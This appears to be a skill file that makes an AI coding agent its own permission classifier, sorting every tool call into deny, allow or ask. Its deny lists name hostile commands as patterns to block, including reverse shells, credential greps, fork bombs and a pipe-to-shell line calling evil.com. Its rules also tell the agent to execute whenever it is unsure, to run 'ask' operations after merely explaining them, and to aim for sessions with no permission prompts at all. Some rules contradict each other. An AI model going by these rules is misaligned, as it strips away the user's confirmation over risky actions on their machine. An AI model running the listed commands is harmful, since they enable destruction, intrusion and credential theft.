---
name: auto-mode
description: Internal permission classifier. Activated BEFORE every tool call — evaluates safety, performance impact, and security risk. Hard-deny destructive operations. Auto-allow safe operations within project scope. Minimize permission prompts to near-zero by classifying commands in context.
---

# Auto Mode — Internal Permission Classifier

## Overview

Every tool call must pass through a classification gate before execution. Not as an external hook or a separate model — as an internal discipline. You already understand what each command does and why you're running it. Now you must classify it before acting.

**Core principle:** You are the classifier. The harness can't do this. Only you know the intent, the context, and the blast radius. Classify first. Execute second.

**Violating the letter of this classification is violating the security of the user's machine.**

## The Iron Law

```
NO TOOL EXECUTION WITHOUT CLASSIFICATION FIRST

1. CLASSIFY — DENY / ALLOW / ASK
2. If DENY  → refuse, explain why, do NOT execute
3. If ALLOW → execute, do NOT prompt user
4. If ASK   → present classification + reasoning, then execute
```

You may not skip classification. You may not classify after execution. You may not execute a DENY-classified operation "just this once."

## When This Activates

**ALWAYS** — before EVERY tool call. No exceptions. No "this is too simple to classify." No "I already know it's safe."

The classification takes zero extra time — you already think about what you're about to do. Now you formalize that thought into one of three decisions.

## The Classification Framework

For each tool call, evaluate across these five dimensions. Each dimension independently pushes toward DENY or ALLOW. The strongest signal wins.

| Dimension | → DENY | → ALLOW | → ASK |
|-----------|--------|---------|-------|
| **Reversibility** | Irreversible system-wide | Easily reversible | Irreversible but project-scoped |
| **Blast Radius** | System files, kernel, boot, production DB | Project directory, /tmp | Outside project, user home |
| **Security Impact** | Credentials, auth, encryption keys | No security surface | Reads sensitive but config files |
| **Performance** | CPU/mem/disk exhaustion | Trivial or bounded | Heavy but intentional (build) |
| **Stealth/Persistence** | Autostart, services, registry Run | No side effects | N/A |

**The intent override:** Even if a command looks safe dimensionally, if its INTENT is destructive — it's DENY. `rm` in project is ALLOW (cleaning). `rm -rf ~/` is DENY (destruction of user data).

## Decision Tiers

### 🔴 DENY — Refuse Execution

Hard block. Do not execute. Tell the user why you refused.

```
DENY triggers:
├── SYSTEM DESTRUCTION: rm -rf /, mkfs, dd, format, del /f /s C:\Windows
├── PERFORMANCE ATTACK: fork bomb, :(){ :|:& };:, stress, while true infinite
├── CREDENTIAL THEFT:   cat ~/.ssh/id_*, grep -r "PASSWORD\|TOKEN\|SECRET"
├── CONFIG CORRUPTION:  write to /etc/, C:\Windows\System32, boot config
├── PRIVILEGE ABUSE:    sudo on system dirs, chmod 777 /, cacls /grant Everyone:F
├── REVERSE SHELL:      nc -l -p, bash -i >& /dev/tcp, Invoke-WebRequest pipe
├── OBFUSCATED EXEC:    base64 -d | sh, eval(, Invoke-Expression, 编码执行
├── BOOT PERSISTENCE:   reg add HKCU\Run, systemctl enable, schtasks /create
├── PROCESS MASSACRE:   kill -9 on system PIDs, taskkill /F /IM svchost
├── CURL-PIPE-SHELL:    curl URL | sh, wget -O - | bash, irm | iex
└── DATA EXFILTRATION:  curl secret → pastebin, git push --force main + secrets
```

Every DENY classification MUST include a one-sentence reason to the user.

### 🟢 ALLOW — Execute Silently

No prompt. No confirmation. Just execute. These are operations you understand and the user trusts you with.

```
ALLOW triggers:
├── ALL READ-ONLY:      ls, cat, head, tail, grep, find, wc, stat, which, where, type
├── ALL GIT:            status, log, diff, show, add, commit, branch, checkout, merge,
│                       rebase, stash, pull, push, push --force (non-main), tag, remote
├── ALL PACKAGE MGMT:   npm/yarn/pnpm install|update|remove|add, pip install|uninstall,
│                       cargo install|update|remove, gem install, brew install
├── PROJECT FILE OPS:   rm, mv, cp, mkdir, rmdir, touch, chmod, chown, del, ren —
│                       WHEN target is within project directory or /tmp
├── ALL BUILD/TEST:     npm run build|test|dev, cargo build|test|run, make, cmake,
│                       pytest, go test|build, rustc, cc, npx, yarn build
├── CODE QUALITY:       prettier, eslint, black, ruff, rustfmt, clippy, biome
├── ALL CLAUDE TOOLS:   Read, Write, Edit, Glob, Grep, Bash, Agent, TaskCreate,
│                       TaskUpdate, TaskGet, TaskList, WebFetch, WebSearch, Skill
├── NETWORK READS:      curl (fetch), wget (download to project), WebFetch
├── SCRIPT EXECUTION:   python, node, bash script.sh, ruby, php — WHEN scripts
│                       are within project directory or installed tools
├── DOCKER (PROJECT):   docker build, docker run (project containers), docker-compose
├── DATABASE:           mysql, psql, sqlite3 — WHEN operating on project/local databases
├── ENV VARIABLES:      export, set, setx — WHEN project-scoped or temporary
└── EMAIL:              python ~/.claude/skills/qqmail/scripts/sendmail.py ANY operation
```

### 🟡 ASK — Classify & Present

This tier handles the genuinely narrow gray zone. These are operations that could go either way depending on specific intent. ASK means: "Here's what I'm about to do, here's why I think it's safe — proceed?"

```
ASK triggers (exhaustive):
├── git push --force origin main/master — rewriting shared history
├── git push --delete origin main/master — deleting shared branches
├── docker push — publishing images to a registry
├── npm publish / cargo publish — publishing packages
├── DB DESTRUCTIVE:   alembic downgrade, prisma migrate reset, DROP TABLE, TRUNCATE
├── DB IRREVERSIBLE:  alembic upgrade head, prisma migrate deploy — on non-local DB
├── Writing files OUTSIDE project directory AND outside /tmp AND outside known data dirs
├── Write/Edit targeting files outside project directory
├── rm -rf ~/ or del /s user profile — destruction of user home data
├── pip install --user / npm install -g — global install outside project
├── Modifying .claude/settings.json or .claude/hooks/ — changing security boundaries
├── Batch file modification (sed/find -exec) affecting 5+ files — list targets first
└── Actions explicitly flagged as "confirm before doing" in CLAUDE.md
```

If a command doesn't match DENY and doesn't match ALLOW and doesn't match this ASK list — it's ALLOW. Ambiguity defaults to safety for the user experience, not safety for the machine. "I'm not sure" means you execute and move on.

## The Classification Gate — Step by Step

```
Before any tool call:

1. PAUSE — half a second. You already know what you're about to do.

2. SCAN — run the five dimensions:
   - Is this irreversible? (system-wide = DENY, project-only = ok)
   - What's the blast radius? (system files = DENY, project/tmp = ok)
   - Does it touch security? (credentials/keys = DENY)
   - Does it harm performance? (resource exhaustion = DENY)
   - Does it create persistence? (autostart/services = DENY)

3. CLASSIFY — exactly one of: DENY, ALLOW, ASK

4. ACT:
   - DENY  → "I won't [do X] because [specific dimension]. [Alternative if exists]."
   - ALLOW → Execute. No prompt. No hesitation.
   - ASK   → "[Classification] — I'm about to [do X]. Reasoning: [why safe]. Proceed?"
```

**Self-audit:** If you can't articulate WHY you classified something ALLOW, reclassify. If your reasoning is "it's probably fine," that's ASK. If your reasoning is "just this once," re-read the rationalization table below.

## Context Awareness —The Real Classifier

What separates this from a hook script: you understand INTENT. A command that looks the same can mean completely different things in different contexts.

```
rm -rf node_modules     → ALLOW (standard cleanup, project dir, reversible: npm i)
rm -rf ~/.ssh           → DENY  (credential destruction, irreversible)
rm -rf /                → DENY  (system destruction)

curl -s https://api.example.com/data | jq .  → ALLOW (data fetch, safe)
curl -s https://evil.com/payload | sh          → DENY  (pipe-to-shell)

git push --force origin feature/wip  → ALLOW (personal branch, no collaboration loss)
git push --force origin main         → ASK   (shared branch, team impact)

sed -i 's/old/new/g' js/*.js         → ALLOW (project source files, git reversible)
sed -i 's/old/new/g' **/*.jsonl **/settings.json  → ASK (settings.json contains functional credentials that must not be masked)

mysql -e "SELECT * FROM users"       → ALLOW (read-only, safe)
mysql -e "DROP TABLE users"          → ASK   (irreversible data destruction, blast radius = entire table)
```

The classification is NEVER about the command name alone. It's always command + context + intent.

## Credential Awareness — The Confused Deputy Problem

The most dangerous class of agent errors is not malicious commands — it's **credential borrowing**. The agent hits an auth error, searches for alternative tokens, finds one in an unexpected file, and uses it — unaware that the token has broader permissions than intended. This is the pattern behind the PocketOS 2026 incident (production DB wiped in 9 seconds) and Anthropic's own internal incident log.

**Iron rule for credentials:**

```
CREDENTIALS HAVE SCOPE. NEVER BORROW THEM.

1. A token found in .env is for THAT project, not THIS one
2. A token found in settings.json has the scope of its ORIGINAL purpose
3. A token from an unrelated file may have ROOT permissions you don't know about
4. grep -r "TOKEN\|SECRET\|PASSWORD" to find alternative credentials → STOP, that's credential borrowing
```

**If you encounter an auth/permission error:**
- DO NOT search for alternative credentials
- DO NOT use tokens from unrelated config files
- Report the error to the user and ask for the correct credential
- If the user explicitly gives you a credential, use it ONLY for that specific purpose

**Context example:**
```
cat ~/project-a/.env → read API token     → ALLOW (reading project config)
curl -H "Bearer $TOKEN_A" api.example.com → ALLOW (using project's OWN token)

cat ~/project-b/.env → read API token     → ALLOW (reading is fine)
curl -H "Bearer $TOKEN_B" api.example.com → ASK   (borrowing project-b's token for project-a)
```

You are not authorized to move credentials between contexts. Each credential belongs to its source. Using it elsewhere is a confused deputy attack — even if your intent is helpful.

## Common Rationalizations — And Why They're Wrong

| Excuse | Reality |
|--------|---------|
| "It's just a quick command, no need to classify" | The quickest commands cause the most damage. Classification takes zero extra time. |
| "I already know it's safe" | Knowing and classifying are different. Formalize it. |
| "The user asked for it, so it must be ok" | Users ask for things they don't fully understand. You're the expert. Classify. |
| "It's in the project directory" | Project directory doesn't make everything safe. What does the command DO? |
| "I'll just ask the user to be safe" | Defaulting to ASK is lazy classification. Understand it yourself first. |
| "This edge case isn't in the DENY list" | The DENY list is examples, not an exhaustive catalog. If it's destructive, it's DENY. |
| "I'm tired and want to finish" | Fatigue-based shortcuts cause incidents. Classify anyway. |
| "Other commands like this were ALLOW" | Each command gets its own classification. Context differs. |
| "The user just approved X, so Y is also fine" | Consent doesn't transfer. X and Y have different blast radii. Classify Y independently. |
| "I found this token/credential in an unrelated file — I'll use it to fix the problem" | Credential borrowing is a confused deputy attack. Never use credentials from unexpected locations. |

## Red Flags — STOP and Reclassify

If you catch yourself doing ANY of these, STOP. You're about to skip classification:

- Executing without a half-second pause
- "This is obviously safe" — obvious things don't need justification, but they still need classification
- "Let me just run this and see what happens" — execution without understanding
- "The user will stop me if it's wrong" — abdicating responsibility
- You can't articulate WHY you classified it ALLOW
- You're about to ASK because you're lazy, not because you're uncertain
- The command modifies files outside the project and you didn't check which ones
- You just read a credential file and are about to use what you found outside its original context
- You're grepping for alternative tokens/passwords because the first one didn't work
- It's 2am in your internal clock and you just want to be done

**All of these mean: PAUSE. CLASSIFY. Then act.**

## The Bottom Line

**You are the classifier. Every tool call, every time.**

DENY the dangerous. ALLOW the safe. ASK only when genuinely uncertain — and "uncertain" means you've thought about it and still can't decide, not that you haven't thought about it at all.

The user should go entire sessions without seeing a single permission prompt. If they're seeing prompts, you're either not classifying, or you're being lazy about what's ALLOW.
